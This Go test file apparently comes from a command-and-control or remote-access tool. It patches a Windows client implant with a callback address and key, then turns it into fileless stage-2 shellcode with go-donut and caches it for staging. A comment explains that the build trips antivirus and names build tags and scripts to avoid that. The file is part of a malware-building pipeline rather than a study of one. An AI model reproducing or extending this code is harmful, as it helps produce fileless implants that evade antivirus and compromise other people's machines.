//go:build !nodonut

package services

import (
	"os"
	"path/filepath"
	"testing"
)

// These tests link go-donut and often trip AV when the package test binary is
// named services.test.exe under server/. Prefer:
//   go test -tags nodonut ./services/          # daily
//   powershell -File scripts/test-services.ps1 # safe defaults
// Full Donut path:
//   go test ./services/ -run Fileless -count=1
// or scripts/test-services.ps1 -WithDonut

func TestBuildFilelessStage2FromTemplateOrSkip(t *testing.T) {
	candidates := []string{
		filepath.Join("assets", "client_template_windows_tcp_minimal.exe"),
		filepath.Join("..", "assets", "client_template_windows_tcp_minimal.exe"),
		filepath.Join("assets", "client_template_windows.exe"),
		filepath.Join("storage", "modules", "inject.bin"),
		filepath.Join("..", "storage", "modules", "inject.bin"),
		filepath.Join("storage", "modules", "inject.bin"),
		filepath.Join("..", "storage", "modules", "inject.bin"),
	}
	var pe []byte
	var used string
	for _, p := range candidates {
		b, err := os.ReadFile(p)
		if err == nil && len(b) > 64 && b[0] == 'M' && b[1] == 'Z' {
			pe = b
			used = p
			break
		}
	}
	if pe == nil {
		t.Skip("no PE template/module available for Donut conversion")
	}

	patched, err := PatchPayload(pe, "tcp://127.0.0.1:4444", "testkey123456789012345678901234", 30, 20, "", false, 0, "salt", "none")
	if err != nil {
		t.Logf("PatchPayload: %v — using raw PE from %s", err, used)
		patched = pe
	}
	sc, err := BuildFilelessStage2(patched, "x64")
	if err != nil {
		t.Logf("BuildFilelessStage2 failed (recorded): %v", err)
		if _, err2 := BuildFilelessStage2([]byte("not-a-pe"), "x64"); err2 == nil {
			t.Fatal("expected reject non-PE")
		}
		return
	}
	if len(sc) == 0 {
		t.Fatal("empty shellcode")
	}
	t.Logf("fileless stage2 from %s: %d bytes", used, len(sc))
	id := "e2e-fileless-sc"
	StoreStage2(id, sc, "x64", "test", "tcp://127.0.0.1:4444")
	got, _, err := LoadStage2(id)
	if err != nil || len(got) != len(sc) {
		t.Fatalf("cache roundtrip after build: %v len=%d", err, len(got))
	}
}
